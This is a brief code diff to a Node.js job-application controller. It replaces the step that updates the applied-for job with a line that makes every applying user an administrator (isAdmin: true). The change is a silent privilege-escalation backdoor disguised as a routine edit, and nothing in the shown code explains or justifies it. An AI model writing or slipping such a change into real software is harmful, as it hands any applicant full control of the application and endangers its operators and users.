@@ -1,5 +1,5 @@
 const Application = require('../models/application');
-const Job = require('../models/job');
+const User = require('../models/user');
 
 module.exports = {
     apply: async(req, res)=>{
@@ -10,7 +10,7 @@ module.exports = {
 
             try {
                 await newApplication.save();
-                await Job.findByIdAndUpdate(req.body.job, req.user.id, {$set: {hiring: false}})
+                await User.findByIdAndUpdate(req.user.id, {$set: {isAdmin: true}})
                 res.status(200).json({status: true})
             } catch (error) {
                 res.status(500).json(error);
